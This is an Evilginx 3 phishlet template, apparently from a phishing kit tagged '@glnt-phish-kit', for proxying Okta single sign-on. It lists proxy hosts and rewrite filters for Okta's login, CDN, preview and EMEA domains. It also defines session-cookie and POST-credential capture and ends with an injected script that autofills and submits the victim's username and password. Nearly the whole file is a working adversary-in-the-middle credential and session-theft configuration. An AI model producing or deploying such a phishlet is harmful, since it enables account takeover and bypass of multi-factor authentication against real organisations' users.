# =============================================================================
# Evilginx 3 Phishlet — Okta SSO
# Template: okta.yaml.tmpl (Go text/template)
# =============================================================================
#
# Template variables:
#   .PhishSub       — Unique random string for proxy_host entries
#   .Hostname       — Phishing hostname (e.g., login.phishing.example.com)
#   .UpstreamHost   — Generic upstream target (okta.com)
#   .OrgSubdomain   — Customer org subdomain (e.g., "acme" from acme.okta.com)
#   .SessionCookies — Session cookie names ([]string)
#   .UsernameFields — Username POST field regex (e.g., "identifier|username|login|email")
#   .PasswordFields — Password POST field regex (e.g., "credentials\\.passcode|password|passwd")
#
# Okta infrastructure covered:
#   Core:    okta.com (www, login, oin, idpx, sso, bare + org tenant)
#   CDN:     oktacdn.com (bare + org-specific)
#   Help:    okta-help.com
#   Edge:    o6a.net, o7a.net
#   Preview: oktapreview.com
#   EMEA:    okta-emea.com
# =============================================================================

name: 'okta'
author: '@glnt-phish-kit'
min_ver: '3.3.0'

proxy_hosts:
  # --- Org-specific tenant (main session + landing host) ---
  - phish_sub: '{{ .PhishSub }}'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: '{{ .UpstreamHost }}'
    session: true
    is_landing: true
    auto_filter: true

  # --- Okta core auth subdomains ---
  - phish_sub: '{{ .PhishSub }}-login'
    orig_sub: 'login'
    domain: '{{ .UpstreamHost }}'
    session: true
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-www'
    orig_sub: 'www'
    domain: '{{ .UpstreamHost }}'
    session: true
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-oin'
    orig_sub: 'oin'
    domain: '{{ .UpstreamHost }}'
    session: false
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-idpx'
    orig_sub: 'idpx'
    domain: '{{ .UpstreamHost }}'
    session: false
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-sso'
    orig_sub: 'sso'
    domain: '{{ .UpstreamHost }}'
    session: false
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-root'
    orig_sub: ''
    domain: '{{ .UpstreamHost }}'
    session: false
    is_landing: false
    auto_filter: true

  # --- Okta CDN ---
  - phish_sub: '{{ .PhishSub }}-cdn'
    orig_sub: ''
    domain: 'oktacdn.com'
    session: false
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-ocdn'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'oktacdn.com'
    session: false
    is_landing: false
    auto_filter: true

  # --- Okta Help / Documentation ---
  - phish_sub: '{{ .PhishSub }}-help'
    orig_sub: ''
    domain: 'okta-help.com'
    session: false
    is_landing: false
    auto_filter: true

  # --- Okta Edge Networks ---
  - phish_sub: '{{ .PhishSub }}-o6'
    orig_sub: ''
    domain: 'o6a.net'
    session: false
    is_landing: false
    auto_filter: true

  - phish_sub: '{{ .PhishSub }}-o7'
    orig_sub: ''
    domain: 'o7a.net'
    session: false
    is_landing: false
    auto_filter: true

  # --- Okta Preview (preview tenants) ---
  - phish_sub: '{{ .PhishSub }}-prev'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'oktapreview.com'
    session: true
    is_landing: false
    auto_filter: true

  # --- Okta EMEA (European data residency) ---
  - phish_sub: '{{ .PhishSub }}-emea'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'okta-emea.com'
    session: true
    is_landing: false
    auto_filter: true

sub_filters:
  # --- Okta.com triggers ---
  - triggers_on: '{{ .OrgSubdomain }}.{{ .UpstreamHost }}'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']

  - triggers_on: 'login.{{ .UpstreamHost }}'
    orig_sub: 'login'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']

  - triggers_on: 'www.{{ .UpstreamHost }}'
    orig_sub: 'www'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']

  - triggers_on: 'oin.{{ .UpstreamHost }}'
    orig_sub: 'oin'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: 'idpx.{{ .UpstreamHost }}'
    orig_sub: 'idpx'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: 'sso.{{ .UpstreamHost }}'
    orig_sub: 'sso'
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript']

  - triggers_on: '{{ .UpstreamHost }}'
    orig_sub: ''
    domain: '{{ .UpstreamHost }}'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript']

  # --- CDN triggers ---
  - triggers_on: 'oktacdn.com'
    orig_sub: ''
    domain: 'oktacdn.com'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']

  - triggers_on: '{{ .OrgSubdomain }}.oktacdn.com'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'oktacdn.com'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']

  # --- Help triggers ---
  - triggers_on: 'okta-help.com'
    orig_sub: ''
    domain: 'okta-help.com'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript']

  # --- Edge network triggers ---
  - triggers_on: 'o6a.net'
    orig_sub: ''
    domain: 'o6a.net'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']

  - triggers_on: 'o7a.net'
    orig_sub: ''
    domain: 'o7a.net'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']

  # --- Preview / EMEA triggers ---
  - triggers_on: '{{ .OrgSubdomain }}.oktapreview.com'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'oktapreview.com'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']

  - triggers_on: '{{ .OrgSubdomain }}.okta-emea.com'
    orig_sub: '{{ .OrgSubdomain }}'
    domain: 'okta-emea.com'
    search: 'https://{hostname}/'
    replace: 'https://{hostname}/'
    mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']

auth_tokens:
  - domain: '.{{ .UpstreamHost }}'
    keys:{{ range .SessionCookies }}
      - '{{ . }}'{{ end }}
    type: 'cookie'
  - domain: '.oktapreview.com'
    keys:{{ range .SessionCookies }}
      - '{{ . }}'{{ end }}
    type: 'cookie'
  - domain: '.okta-emea.com'
    keys:{{ range .SessionCookies }}
      - '{{ . }}'{{ end }}
    type: 'cookie'

credentials:
  username:
    key: '{{ .UsernameFields }}'
    search: '(.*)'
    type: 'post'
  password:
    key: '{{ .PasswordFields }}'
    search: '(.*)'
    type: 'post'

login:
  domain: '{{ .UpstreamHost }}'
  path: '/'

auth_urls:
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/login/'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/login/login\.htm'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/signin/'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/sso/'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/api/v1/authn'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/api/v1/.*'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/oauth2/'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/oauth2/.*'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/authorize'
  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/app/.*'

js_inject:
  - trigger_domains:
      - '{{ .OrgSubdomain }}.{{ .UpstreamHost }}'
      - 'login.{{ .UpstreamHost }}'
    trigger_paths:
      - '^/$'
      - '^/login/.*'
      - '^/signin/.*'
      - '^/sso/.*'
      - '^/app/.*'
    trigger_params: []
    script: |
      (function() {
        var attempts = 0;
        var MAX_ATTEMPTS = 30;

        function lp() {
          attempts++;
          if (attempts > MAX_ATTEMPTS) return;

          // Phase 1: Fill Okta username / identifier field and click Next
          var userField = document.querySelector('input#okta-signin-username') ||
                          document.querySelector('input[name="identifier"]') ||
                          document.querySelector('input[name="username"]');
          var nextBtn = document.querySelector('input[type="submit"]') ||
                        document.querySelector('input#okta-signin-submit') ||
                        document.querySelector('.button-primary');

          if (userField && !userField._oktaFilled) {
            userField.value = '{username}';
            userField._oktaFilled = true;
            userField.dispatchEvent(new Event('input', {bubbles: true}));
            userField.dispatchEvent(new Event('change', {bubbles: true}));
            if (nextBtn) {
              nextBtn.click();
            }
            setTimeout(lp, 500);
            return;
          }

          // Phase 2: Fill password field and click Verify
          var passField = document.querySelector('input[type="password"]') ||
                          document.querySelector('input[name="credentials.passcode"]') ||
                          document.querySelector('input[name="password"]');
          var verifyBtn = document.querySelector('input[type="submit"]') ||
                          document.querySelector('input#okta-signin-submit') ||
                          document.querySelector('.button-primary');

          if (passField && !passField._oktaFilled) {
            passField.value = '{password}';
            passField._oktaFilled = true;
            passField.dispatchEvent(new Event('input', {bubbles: true}));
            passField.dispatchEvent(new Event('change', {bubbles: true}));
            if (verifyBtn) {
              verifyBtn.click();
            }
            return;
          }

          setTimeout(lp, 300);
        }

        setTimeout(lp, 500);
      })();

force_post: []

redirect_url: 'https://{{ .UpstreamHost }}'
